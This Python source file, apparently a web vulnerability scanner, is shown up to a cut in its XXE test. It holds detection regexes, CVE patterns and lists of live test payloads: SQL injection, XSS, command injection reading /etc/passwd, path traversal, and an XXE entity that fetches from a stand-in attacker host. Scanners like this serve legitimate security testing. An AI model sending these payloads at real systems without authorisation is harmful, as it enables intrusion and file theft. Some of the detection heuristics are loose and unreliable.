"""
vulnerability_detector.py - Advanced Vulnerability Detection Engine
Specialized detection for complex vulnerability patterns and zero-days
"""

import re
import json
import hashlib
from typing import Dict, List, Any, Optional, Set, Tuple
import aiohttp
import urllib.parse
from datetime import datetime, timedelta
import asyncio
from dataclasses import dataclass, field
from enum import Enum
import html

class VulnerabilityCategory(Enum):
    """Categories for grouping vulnerability types"""
    INJECTION = "injection"                # SQLi, Command Injection, etc.
    BROKEN_AUTH = "broken_authentication"  # Auth bypass, session issues
    DATA_EXPOSURE = "data_exposure"        # Sensitive data leaks
    XXE = "xxe"                            # XML External Entity
    ACCESS_CONTROL = "access_control"      # IDOR, privilege escalation
    SECURITY_MISCONFIG = "security_misconfig"  # Configuration issues
    XSS = "xss"                            # Cross-Site Scripting
    INSECURE_DESERIALIZATION = "insecure_deserialization"
    COMPONENTS = "vulnerable_components"   # Outdated libraries
    LOGGING_MONITORING = "logging_monitoring"  # Insufficient logging

@dataclass
class DetectionRule:
    """Definition of a vulnerability detection rule"""
    id: str                                # Unique rule identifier
    name: str                              # Human-readable name
    category: VulnerabilityCategory        # Vulnerability category
    description: str                       # What the rule detects
    regex_pattern: str                     # Regular expression pattern
    severity: str                          # Severity level
    confidence: float                      # Default confidence score
    cwe_id: str                           # Associated CWE identifier
    remediation: str                      # How to fix
    tags: List[str] = field(default_factory=list)  # Additional tags

class VulnerabilityDetector:
    """
    Advanced vulnerability detection engine
    Uses pattern matching, heuristics, and behavioral analysis
    """
    
    def __init__(self):
        """Initialize detection engine with rules and patterns"""
        self.detection_rules = self._load_detection_rules()
        self.false_positive_patterns = self._load_fp_patterns()
        self.whitelist_patterns = self._load_whitelist_patterns()
        self.vulnerability_signatures = self._load_vulnerability_signatures()
        
        # State tracking for behavioral detection
        self.request_patterns = {}
        self.response_patterns = {}
        self.anomaly_scores = {}
        
        # CVE database integration (simplified)
        self.cve_patterns = self._load_cve_patterns()
    
    def _load_detection_rules(self) -> List[DetectionRule]:
        """
        Load comprehensive detection rules for various vulnerabilities
        Returns list of DetectionRule objects
        """
        rules = [
            # SQL Injection Rules
            DetectionRule(
                id="SQLI-001",
                name="SQL Syntax Error Detection",
                category=VulnerabilityCategory.INJECTION,
                description="Detects SQL syntax errors in responses",
                regex_pattern=r"(SQL syntax|mysql_fetch|ORA-[0-9]{5}|PostgreSQL.*ERROR|Warning.*mysql_)",
                severity="critical",
                confidence=0.9,
                cwe_id="CWE-89",
                remediation="Use parameterized queries",
                tags=["sql", "injection", "database"]
            ),
            DetectionRule(
                id="SQLI-002",
                name="SQL Time-Based Detection",
                category=VulnerabilityCategory.INJECTION,
                description="Detects time-based SQL injection patterns",
                regex_pattern=r"(sleep\(|waitfor delay|pg_sleep|benchmark\()",
                severity="critical",
                confidence=0.85,
                cwe_id="CWE-89",
                remediation="Implement input validation",
                tags=["sql", "blind", "timing"]
            ),
            
            # Command Injection Rules
            DetectionRule(
                id="CMDI-001",
                name="Command Injection Pattern",
                category=VulnerabilityCategory.INJECTION,
                description="Detects command injection attempts",
                regex_pattern=r"(;\s*(ls|dir|cat|type|whoami|id)|\\|.*\\.*\\|`.*`|\$\(.*\))",
                severity="critical",
                confidence=0.8,
                cwe_id="CWE-78",
                remediation="Use safe APIs, validate inputs",
                tags=["command", "shell", "injection"]
            ),
            
            # XSS Rules
            DetectionRule(
                id="XSS-001",
                name="Reflected XSS Pattern",
                category=VulnerabilityCategory.XSS,
                description="Detects reflected XSS in responses",
                regex_pattern=r"(<script>.*?</script>|<img.*?onerror=|javascript:|alert\(|prompt\(|confirm\()",
                severity="high",
                confidence=0.75,
                cwe_id="CWE-79",
                remediation="Implement output encoding",
                tags=["xss", "reflected", "client-side"]
            ),
            DetectionRule(
                id="XSS-002",
                name="DOM-based XSS Indicators",
                category=VulnerabilityCategory.XSS,
                description="Detects DOM-based XSS patterns",
                regex_pattern=r"(document\.(location|URL|URLUnencoded|referrer)|window\.location|location\.hash)",
                severity="high",
                confidence=0.7,
                cwe_id="CWE-79",
                remediation="Use safe DOM manipulation",
                tags=["xss", "dom", "client-side"]
            ),
            
            # Path Traversal Rules
            DetectionRule(
                id="PT-001",
                name="Path Traversal Pattern",
                category=VulnerabilityCategory.INJECTION,
                description="Detects path traversal attempts",
                regex_pattern=r"(\.\./|\.\.\\|%2e%2e%2f|%252e%252e%252f)",
                severity="high",
                confidence=0.85,
                cwe_id="CWE-22",
                remediation="Validate file paths",
                tags=["path", "traversal", "directory"]
            ),
            
            # XXE Rules
            DetectionRule(
                id="XXE-001",
                name="XXE Entity Pattern",
                category=VulnerabilityCategory.XXE,
                description="Detects XML external entity references",
                regex_pattern=r"(<!ENTITY.*SYSTEM|<!DOCTYPE.*\[|<!ENTITY.*%|<!ENTITY.*PUBLIC)",
                severity="critical",
                confidence=0.8,
                cwe_id="CWE-611",
                remediation="Disable XML external entities",
                tags=["xxe", "xml", "entity"]
            ),
            
            # Insecure Deserialization Rules
            DetectionRule(
                id="DESER-001",
                name="Deserialization Pattern",
                category=VulnerabilityCategory.INSECURE_DESERIALIZATION,
                description="Detects insecure deserialization patterns",
                regex_pattern=r"(ObjectInputStream|pickle\.loads|yaml\.load|json\.decode.*__dict__)",
                severity="critical",
                confidence=0.7,
                cwe_id="CWE-502",
                remediation="Use safe serialization formats",
                tags=["deserialization", "pickle", "yaml"]
            ),
            
            # SSRF Rules
            DetectionRule(
                id="SSRF-001",
                name="SSRF URL Pattern",
                category=VulnerabilityCategory.INJECTION,
                description="Detects server-side request forgery patterns",
                regex_pattern=r"(https?://(127\.0\.0\.1|localhost|192\.168|10\.|172\.(1[6-9]|2[0-9]|3[0-1])))",
                severity="high",
                confidence=0.75,
                cwe_id="CWE-918",
                remediation="Validate and restrict URL schemes",
                tags=["ssrf", "internal", "request"]
            ),
            
            # File Inclusion Rules
            DetectionRule(
                id="FI-001",
                name="File Inclusion Pattern",
                category=VulnerabilityCategory.INJECTION,
                description="Detects file inclusion attempts",
                regex_pattern=r"(include\(|require\(|include_once\(|require_once\(|file_get_contents\(|file\s*=\s*)",
                severity="high",
                confidence=0.7,
                cwe_id="CWE-98",
                remediation="Use allowlists for included files",
                tags=["file", "include", "php"]
            ),
            
            # Information Disclosure Rules
            DetectionRule(
                id="INFO-001",
                name="Sensitive Data Pattern",
                category=VulnerabilityCategory.DATA_EXPOSURE,
                description="Detects sensitive information in responses",
                regex_pattern=r"(password\s*[=:]\s*\S+|api[_-]?key\s*[=:]\s*\S+|secret\s*[=:]\s*\S+)",
                severity="medium",
                confidence=0.9,
                cwe_id="CWE-200",
                remediation="Remove sensitive data from responses",
                tags=["info", "disclosure", "sensitive"]
            ),
        ]
        
        return rules
    
    def _load_fp_patterns(self) -> List[str]:
        """
        Load false positive patterns to reduce noise
        Returns list of regex patterns that indicate false positives
        """
        return [
            r"SQL syntax.*tutorial",           # Tutorial examples
            r"example.*password",               # Example code
            r"test.*api_key",                   # Test data
            r"dummy.*secret",                   # Dummy values
            r"placeholder.*token",              # Placeholder text
            r"sample.*configuration",           # Sample configs
            r"demo.*credentials",               # Demo accounts
            r"localhost.*example\.com",         # Example domains
            r"127\.0\.0\.1.*test",              # Test localhost references
            r"<script>.*educational",           # Educational content
        ]
    
    def _load_whitelist_patterns(self) -> List[str]:
        """
        Load whitelist patterns for known safe content
        Returns list of regex patterns to whitelist
        """
        return [
            r"https?://cdn\.jsdelivr\.net",     # Common CDN
            r"https?://ajax\.googleapis\.com",  # Google CDN
            r"https?://maxcdn\.bootstrapcdn\.com",  # Bootstrap CDN
            r"https?://fonts\.googleapis\.com", # Google Fonts
            r"https?://use\.fontawesome\.com",  # FontAwesome
            r"^/static/",                       # Static assets
            r"^/assets/",                       # Asset directories
            r"\.(css|js|png|jpg|gif|ico|svg)$", # Static file extensions
        ]
    
    def _load_vulnerability_signatures(self) -> Dict[str, List[str]]:
        """
        Load vulnerability signatures for specific applications/frameworks
        Returns dictionary of application-specific vulnerability patterns
        """
        return {
            "wordpress": [
                r"wp-content/plugins/.*\.php\?.*=",
                r"wp-admin/.*\?.*action=",
                r"xmlrpc\.php.*method="
            ],
            "joomla": [
                r"index\.php\?option=com_",
                r"component/.*\?.*task="
            ],
            "drupal": [
                r"node/\d+",
                r"user/\d+",
                r"admin/.*\?.*q="
            ],
            "phpmyadmin": [
                r"phpmyadmin/.*\.php\?.*=",
                r"db_structure\.php\?.*table="
            ],
            "tomcat": [
                r"/manager/html",
                r"/examples/servlets/"
            ],
            "apache": [
                r"server-status",
                r"server-info"
            ],
            "nginx": [
                r"nginx-status",
                r"/basic_status"
            ]
        }
    
    def _load_cve_patterns(self) -> Dict[str, Dict[str, Any]]:
        """
        Load patterns for known CVE vulnerabilities
        Returns dictionary of CVE patterns and metadata
        """
        return {
            "CVE-2021-44228": {  # Log4Shell
                "pattern": r"\$\{jndi:(ldap|ldaps|rmi|dns|iiop|nis|nds|corba):",
                "severity": "critical",
                "description": "Log4Shell Remote Code Execution"
            },
            "CVE-2021-45046": {  # Log4Shell follow-up
                "pattern": r"\$\{ctx:",
                "severity": "critical",
                "description": "Log4Shell Additional Attack Vector"
            },
            "CVE-2017-5638": {  # Apache Struts
                "pattern": r"Content-Type.*%\{.*\}",
                "severity": "critical",
                "description": "Apache Struts Remote Code Execution"
            },
            "CVE-2019-11510": {  # Pulse Secure
                "pattern": r"/dana-na/.*\.cgi",
                "severity": "critical",
                "description": "Pulse Secure Arbitrary File Read"
            },
            "CVE-2020-14882": {  # Oracle WebLogic
                "pattern": r"/console/css/",
                "severity": "critical",
                "description": "Oracle WebLogic Server RCE"
            }
        }
    
    async def detect_advanced(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Perform advanced vulnerability detection
        Uses multiple techniques to find complex vulnerabilities
        
        Args:
            url: Target URL to scan
            session: HTTP session for making requests
            
        Returns:
            List of vulnerability findings
        """
        findings = []
        
        try:
            print(f"Running advanced vulnerability detection on {url}")
            
            # Phase 1: Static analysis of URL and parameters
            static_findings = await self._static_analysis(url)
            findings.extend(static_findings)
            
            # Phase 2: Dynamic testing with payloads
            dynamic_findings = await self._dynamic_analysis(url, session)
            findings.extend(dynamic_findings)
            
            # Phase 3: Behavioral analysis
            behavioral_findings = await self._behavioral_analysis(url, session)
            findings.extend(behavioral_findings)
            
            # Phase 4: Application fingerprinting
            fingerprint_findings = await self._application_fingerprinting(url, session)
            findings.extend(fingerprint_findings)
            
            # Phase 5: CVE pattern matching
            cve_findings = await self._cve_pattern_matching(url, session)
            findings.extend(cve_findings)
            
            # Filter out false positives
            filtered_findings = self._filter_false_positives(findings)
            
            print(f"Advanced detection completed: {len(filtered_findings)} findings")
            
            return filtered_findings
            
        except Exception as e:
            print(f"Advanced detection error: {str(e)}")
            return []
    
    async def _static_analysis(self, url: str) -> List[Dict[str, Any]]:
        """
        Perform static analysis on URL and parameters
        No HTTP requests made in this phase
        
        Args:
            url: URL to analyze
            
        Returns:
            List of static analysis findings
        """
        findings = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            # Analyze URL structure
            url_analysis = self._analyze_url_structure(parsed_url)
            if url_analysis:
                findings.append(url_analysis)
            
            # Analyze parameters
            for param_name, param_values in query_params.items():
                param_findings = self._analyze_parameter(param_name, param_values)
                findings.extend(param_findings)
            
            # Check for common vulnerable patterns in path
            path_findings = self._analyze_path(parsed_url.path)
            findings.extend(path_findings)
            
        except Exception as e:
            print(f"Static analysis error: {str(e)}")
        
        return findings
    
    def _analyze_url_structure(self, parsed_url: urllib.parse.ParseResult) -> Optional[Dict[str, Any]]:
        """
        Analyze URL structure for suspicious patterns
        
        Args:
            parsed_url: Parsed URL object
            
        Returns:
            Finding if suspicious pattern found, None otherwise
        """
        # Check for encoded characters that might bypass filters
        if '%' in parsed_url.path or '%' in parsed_url.query:
            return {
                'id': f"url_encoding_{hashlib.md5(parsed_url.geturl().encode()).hexdigest()[:8]}",
                'type': "URL Encoding Detected",
                'severity': "low",
                'location': "URL Structure",
                'description': "URL contains encoded characters that might bypass security filters",
                'evidence': "URL contains URL-encoded characters",
                'confidence': 0.4,
                'remediation': "Decode and validate URLs before processing"
            }
        
        # Check for directory traversal in path
        if '..' in parsed_url.path:
            return {
                'id': f"path_traversal_url_{hashlib.md5(parsed_url.path.encode()).hexdigest()[:8]}",
                'type': "Path Traversal Indicator",
                'severity': "medium",
                'location': "URL Path",
                'description': "URL path contains directory traversal sequence",
                'evidence': f"Path contains '..' sequence: {parsed_url.path}",
                'confidence': 0.6,
                'remediation': "Validate and sanitize URL paths"
            }
        
        return None
    
    def _analyze_parameter(self, param_name: str, param_values: List[str]) -> List[Dict[str, Any]]:
        """
        Analyze parameter names and values for suspicious patterns
        
        Args:
            param_name: Parameter name
            param_values: List of parameter values
            
        Returns:
            List of parameter analysis findings
        """
        findings = []
        
        # Check parameter name for suspicious patterns
        param_name_lower = param_name.lower()
        
        # Dictionary of suspicious parameter patterns and their descriptions
        suspicious_param_patterns = {
            'cmd': ("Command Injection Indicator", "medium"),
            'exec': ("Command Injection Indicator", "medium"),
            'system': ("Command Injection Indicator", "medium"),
            'file': ("File Inclusion Indicator", "medium"),
            'page': ("File Inclusion Indicator", "medium"),
            'include': ("File Inclusion Indicator", "medium"),
            'require': ("File Inclusion Indicator", "medium"),
            'callback': ("JSONP Injection Indicator", "low"),
            'jsonp': ("JSONP Injection Indicator", "low"),
            'redirect': ("Open Redirect Indicator", "medium"),
            'url': ("Open Redirect Indicator", "medium"),
            'next': ("Open Redirect Indicator", "medium"),
        }
        
        # Check if parameter name contains any suspicious patterns
        for pattern, (description, severity) in suspicious_param_patterns.items():
            if pattern in param_name_lower:
                findings.append({
                    'id': f"param_name_{pattern}_{hashlib.md5(param_name.encode()).hexdigest()[:8]}",
                    'type': description,
                    'severity': severity,
                    'location': f"Parameter: {param_name}",
                    'description': f"Parameter name suggests potential {description.lower()}",
                    'evidence': f"Parameter name '{param_name}' contains '{pattern}'",
                    'confidence': 0.5,
                    'remediation': "Review parameter usage and implement proper validation"
                })
                break  # Only report first match
        
        # Check parameter values
        for value in param_values:
            value_findings = self._analyze_parameter_value(param_name, value)
            findings.extend(value_findings)
        
        return findings
    
    def _analyze_parameter_value(self, param_name: str, value: str) -> List[Dict[str, Any]]:
        """
        Analyze individual parameter values
        
        Args:
            param_name: Parameter name
            value: Parameter value
            
        Returns:
            List of value analysis findings
        """
        findings = []
        
        # Check for suspicious patterns in values
        if len(value) > 1000:  # Very long parameter values
            findings.append({
                'id': f"long_param_{hashlib.md5(f'{param_name}{value[:100]}'.encode()).hexdigest()[:8]}",
                'type': "Oversized Parameter Value",
                'severity': "low",
                'location': f"Parameter: {param_name}",
                'description': "Parameter value is unusually long",
                'evidence': f"Value length: {len(value)} characters",
                'confidence': 0.3,
                'remediation': "Implement size limits on parameter values"
            })
        
        # Check for encoded content
        if any(encoded in value.lower() for encoded in ['%3c', '%3e', '%22', '%27', '%28', '%29']):
            findings.append({
                'id': f"encoded_param_{hashlib.md5(f'{param_name}{value[:50]}'.encode()).hexdigest()[:8]}",
                'type': "URL-Encoded Content",
                'severity': "low",
                'location': f"Parameter: {param_name}",
                'description': "Parameter contains URL-encoded characters",
                'evidence': "Value contains URL-encoded special characters",
                'confidence': 0.4,
                'remediation': "Decode and validate parameter values"
            })
        
        return findings
    
    def _analyze_path(self, path: str) -> List[Dict[str, Any]]:
        """
        Analyze URL path for suspicious patterns
        
        Args:
            path: URL path component
            
        Returns:
            List of path analysis findings
        """
        findings = []
        
        # Check for common vulnerable endpoints
        vulnerable_endpoints = {
            '/admin': "Admin interface accessible",
            '/phpmyadmin': "PHPMyAdmin interface",
            '/wp-admin': "WordPress admin",
            '/manager/html': "Tomcat manager",
            '/server-status': "Apache status",
            '/debug': "Debug endpoint",
            '/console': "Management console",
            '/api': "API endpoint",
            '/graphql': "GraphQL endpoint",
            '/swagger': "Swagger documentation"
        }
        
        path_lower = path.lower()
        for endpoint, description in vulnerable_endpoints.items():
            if endpoint in path_lower:
                findings.append({
                    'id': f"vuln_endpoint_{endpoint.replace('/', '_')}_{hashlib.md5(path.encode()).hexdigest()[:8]}",
                    'type': "Vulnerable Endpoint Detected",
                    'severity': "medium",
                    'location': f"URL Path: {path}",
                    'description': f"Path contains {description}",
                    'evidence': f"Path contains '{endpoint}' endpoint",
                    'confidence': 0.6,
                    'remediation': "Secure or restrict access to sensitive endpoints"
                })
        
        # Check for file extensions that might indicate vulnerabilities
        vulnerable_extensions = {
            '.php': "PHP script",
            '.asp': "ASP script",
            '.aspx': "ASP.NET script",
            '.jsp': "JSP script",
            '.pl': "Perl script",
            '.cgi': "CGI script",
            '.sh': "Shell script",
            '.py': "Python script",
            '.rb': "Ruby script"
        }
        
        for ext, description in vulnerable_extensions.items():
            if path_lower.endswith(ext):
                findings.append({
                    'id': f"script_ext_{ext[1:]}_{hashlib.md5(path.encode()).hexdigest()[:8]}",
                    'type': "Script File Detected",
                    'severity': "low",
                    'location': f"URL Path: {path}",
                    'description': f"Path ends with {description} extension",
                    'evidence': f"Path ends with '{ext}'",
                    'confidence': 0.5,
                    'remediation': "Validate file uploads and execution permissions"
                })
        
        return findings
    
    async def _dynamic_analysis(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Perform dynamic analysis with test payloads
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of dynamic analysis findings
        """
        findings = []
        
        try:
            # Test for SQL injection with various payloads
            sql_findings = await self._test_sql_injection(url, session)
            findings.extend(sql_findings)
            
            # Test for XSS
            xss_findings = await self._test_xss(url, session)
            findings.extend(xss_findings)
            
            # Test for command injection
            cmd_findings = await self._test_command_injection(url, session)
            findings.extend(cmd_findings)
            
            # Test for path traversal
            path_findings = await self._test_path_traversal(url, session)
            findings.extend(path_findings)
            
            # Test for XXE
            xxe_findings = await self._test_xxe(url, session)
            findings.extend(xxe_findings)
            
            # Test for SSRF
            ssrf_findings = await self._test_ssrf(url, session)
            findings.extend(ssrf_findings)
            
            # Test for open redirect
            redirect_findings = await self._test_open_redirect(url, session)
            findings.extend(redirect_findings)
            
        except Exception as e:
            print(f"Dynamic analysis error: {str(e)}")
        
        return findings
    
    async def _test_sql_injection(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Test for SQL injection vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of SQL injection findings
        """
        findings = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            if not query_params:
                return findings  # No parameters to test
            
            # SQL injection test payloads with descriptions
            test_payloads = [
                ("' OR '1'='1", "Basic SQL injection"),
                ("' OR '1'='1' --", "SQL injection with comment"),
                ("' UNION SELECT NULL--", "Union-based SQLi"),
                ("' AND SLEEP(5)--", "Time-based blind SQLi"),
                ("' OR IF(1=1,SLEEP(5),0)--", "Conditional time-based SQLi"),
                ("'; WAITFOR DELAY '00:00:05'--", "SQL Server time-based"),
                ("' OR pg_sleep(5)--", "PostgreSQL time-based"),
                ("' OR BENCHMARK(5000000,MD5('test'))--", "MySQL time-based"),
                ("' OR 1=1--", "Always true condition"),
                ("' OR 'a'='a", "String comparison bypass")
            ]
            
            for param_name in query_params.keys():
                for payload, description in test_payloads:
                    # Build test URL with payload
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        test_query,
                        parsed_url.fragment
                    ))
                    
                    # Send request and measure time for time-based detection
                    start_time = asyncio.get_event_loop().time()
                    try:
                        async with session.get(test_url) as response:
                            content = await response.text()
                            elapsed = asyncio.get_event_loop().time() - start_time
                            
                            # Check for SQL errors in response
                            sql_errors = [
                                "SQL syntax",
                                "mysql_fetch",
                                "ORA-",
                                "PostgreSQL ERROR",
                                "SQLite3 error",
                                "SQL Server",
                                "Unclosed quotation mark",
                                "Warning: mysql_",
                                "Microsoft OLE DB",
                                "ODBC Driver"
                            ]
                            
                            sql_error_found = any(error in content for error in sql_errors)
                            
                            # Check for time delay (time-based SQLi)
                            time_based = elapsed > 4 and 'sleep' in payload.lower()
                            
                            if sql_error_found or time_based:
                                evidence = []
                                if sql_error_found:
                                    evidence.append("SQL error in response")
                                if time_based:
                                    evidence.append(f"Response delayed by {elapsed:.2f} seconds")
                                
                                finding = {
                                    'id': f"sqli_test_{param_name}_{hashlib.md5(payload.encode()).hexdigest()[:8]}",
                                    'type': "SQL Injection",
                                    'severity': "critical",
                                    'location': f"Parameter: {param_name}",
                                    'description': "SQL injection vulnerability detected",
                                    'evidence': f"{description}. {' '.join(evidence)}",
                                    'confidence': 0.85 if sql_error_found else 0.7,
                                    'remediation': "Use parameterized queries or prepared statements"
                                }
                                findings.append(finding)
                                break  # Stop testing this parameter after first finding
                    except Exception as req_error:
                        print(f"SQL injection test request error: {req_error}")
                        continue
            
        except Exception as e:
            print(f"SQL injection test error: {str(e)}")
        
        return findings
    
    async def _test_xss(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Test for Cross-Site Scripting vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of XSS findings
        """
        findings = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            if not query_params:
                return findings  # No parameters to test
            
            # XSS test payloads with descriptions
            test_payloads = [
                ('<script>alert("XSS")</script>', "Basic script tag"),
                ('<img src=x onerror=alert("XSS")>', "Image with onerror"),
                ('<svg onload=alert("XSS")>', "SVG with onload"),
                ('" onmouseover="alert(\'XSS\')', "Event handler in attribute"),
                ('javascript:alert("XSS")', "JavaScript protocol"),
                ('<body onload=alert("XSS")>', "Body onload"),
                ('<iframe src="javascript:alert(`XSS`)">', "Iframe with JavaScript"),
                ('<input onfocus=alert("XSS") autofocus>', "Input with onfocus"),
                ('<video><source onerror=alert("XSS")>', "Video source onerror"),
                ('<marquee onstart=alert("XSS")>', "Marquee onstart")
            ]
            
            for param_name in query_params.keys():
                for payload, description in test_payloads:
                    # Build test URL with payload
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        test_query,
                        parsed_url.fragment
                    ))
                    
                    try:
                        async with session.get(test_url) as response:
                            content = await response.text()
                            
                            # Check if payload is reflected in response
                            if payload in content:
                                finding = {
                                    'id': f"xss_test_{param_name}_{hashlib.md5(payload.encode()).hexdigest()[:8]}",
                                    'type': "Cross-Site Scripting (XSS)",
                                    'severity': "high",
                                    'location': f"Parameter: {param_name}",
                                    'description': "Reflected XSS vulnerability detected",
                                    'evidence': f"{description}. Payload reflected in response",
                                    'confidence': 0.8,
                                    'remediation': "Implement proper input validation and output encoding"
                                }
                                findings.append(finding)
                                break  # Stop testing this parameter after first finding
                    except Exception as req_error:
                        print(f"XSS test request error: {req_error}")
                        continue
            
        except Exception as e:
            print(f"XSS test error: {str(e)}")
        
        return findings
    
    async def _test_command_injection(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Test for command injection vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of command injection findings
        """
        findings = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            if not query_params:
                return findings  # No parameters to test
            
            # Command injection test payloads with descriptions
            test_payloads = [
                ('; ls', "Unix command injection"),
                ('| dir', "Windows command injection"),
                ('`id`', "Backtick command injection"),
                ('$(whoami)', "Dollar command injection"),
                ('; ping -c 1 127.0.0.1', "Network command"),
                ('| type %SYSTEMROOT%\\win.ini', "Windows file read"),
                ('; cat /etc/passwd', "Unix file read"),
                ('`echo test`', "Backtick echo"),
                ('$(echo test)', "Dollar echo"),
                ('; sleep 5', "Time-based detection")
            ]
            
            # Get baseline response time
            baseline_time = asyncio.get_event_loop().time()
            try:
                async with session.get(url) as base_response:
                    await base_response.text()  # Read to complete request
            except:
                pass  # Ignore baseline errors
            
            for param_name in query_params.keys():
                for payload, description in test_payloads:
                    # Build test URL with payload
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        test_query,
                        parsed_url.fragment
                    ))
                    
                    # Time-based detection for command injection
                    start_time = asyncio.get_event_loop().time()
                    try:
                        async with session.get(test_url, timeout=10) as response:
                            content = await response.text()
                            elapsed = asyncio.get_event_loop().time() - start_time
                            
                            # Check for command output in response
                            command_indicators = [
                                'root:',  # /etc/passwd
                                '[fonts]',  # win.ini
                                'test',  # echo output
                                'uid=',  # id command
                                '127.0.0.1',  # ping output
                                'Directory of',  # dir output
                                'total',  # ls output
                                'bytes from'  # ping output
                            ]
                            
                            command_output_found = any(indicator in content for indicator in command_indicators)
                            time_based = elapsed > 4 and 'sleep' in payload.lower()
                            
                            if command_output_found or time_based:
                                evidence = []
                                if command_output_found:
                                    evidence.append("Command output in response")
                                if time_based:
                                    evidence.append(f"Response delayed by {elapsed:.2f} seconds")
                                
                                finding = {
                                    'id': f"cmdi_test_{param_name}_{hashlib.md5(payload.encode()).hexdigest()[:8]}",
                                    'type': "Command Injection",
                                    'severity': "critical",
                                    'location': f"Parameter: {param_name}",
                                    'description': "Command injection vulnerability detected",
                                    'evidence': f"{description}. {' '.join(evidence)}",
                                    'confidence': 0.8 if command_output_found else 0.6,
                                    'remediation': "Use safe APIs and validate all user inputs"
                                }
                                findings.append(finding)
                                break
                    except asyncio.TimeoutError:
                        # Timeout might indicate successful command injection
                        finding = {
                            'id': f"cmdi_timeout_{param_name}_{hashlib.md5(payload.encode()).hexdigest()[:8]}",
                            'type': "Command Injection",
                            'severity': "critical",
                            'location': f"Parameter: {param_name}",
                            'description': "Potential command injection (timeout)",
                            'evidence': f"Request timed out with payload: {description}",
                            'confidence': 0.5,
                            'remediation': "Use safe APIs and validate all user inputs"
                        }
                        findings.append(finding)
                    except Exception as req_error:
                        print(f"Command injection test request error: {req_error}")
                        continue
            
        except Exception as e:
            print(f"Command injection test error: {str(e)}")
        
        return findings
    
    async def _test_path_traversal(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Test for path traversal vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of path traversal findings
        """
        findings = []
        
        try:
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            if not query_params:
                return findings  # No parameters to test
            
            # Path traversal test payloads with descriptions
            test_payloads = [
                ('../../../etc/passwd', "Unix path traversal"),
                ('..\\..\\windows\\win.ini', "Windows path traversal"),
                ('../../../../../../etc/passwd', "Deep traversal"),
                ('....//....//etc/passwd', "Double dot slash"),
                ('%2e%2e%2fetc%2fpasswd', "URL encoded"),
                ('..%252f..%252fetc%252fpasswd', "Double encoded"),
                ('%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd', "UTF-8 encoded")
            ]
            
            # Sensitive file indicators that would appear if traversal succeeds
            sensitive_indicators = {
                'root:': '/etc/passwd',
                '[fonts]': 'win.ini',
                '<?php': 'PHP file',
                'DatabaseType=': 'configuration file',
                'define(': 'configuration file',
                'password': 'configuration file',
                'secret': 'configuration file'
            }
            
            for param_name in query_params.keys():
                for payload, description in test_payloads:
                    # Build test URL with payload
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        test_query,
                        parsed_url.fragment
                    ))
                    
                    try:
                        async with session.get(test_url) as response:
                            content = await response.text()
                            
                            # Check for sensitive file contents in response
                            for indicator, file_type in sensitive_indicators.items():
                                if indicator in content:
                                    finding = {
                                        'id': f"pathtrav_test_{param_name}_{hashlib.md5(payload.encode()).hexdigest()[:8]}",
                                        'type': "Path Traversal",
                                        'severity': "high",
                                        'location': f"Parameter: {param_name}",
                                        'description': "Path traversal vulnerability detected",
                                        'evidence': f"{description}. Found {file_type} content in response",
                                        'confidence': 0.85,
                                        'remediation': "Validate file paths and implement proper access controls"
                                    }
                                    findings.append(finding)
                                    break
                    except Exception as req_error:
                        print(f"Path traversal test request error: {req_error}")
                        continue
            
        except Exception as e:
            print(f"Path traversal test error: {str(e)}")
        
        return findings
    
    async def _test_xxe(self, url: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
        """
        Test for XML External Entity (XXE) vulnerabilities
        
        Args:
            url: Target URL
            session: HTTP session
            
        Returns:
            List of XXE findings
        """
        findings = []
        
        try:
            # XXE test payloads
            xxe_payloads = [
                """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
                """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe">%remote;]><root/>""",
                """<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
                """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>""",
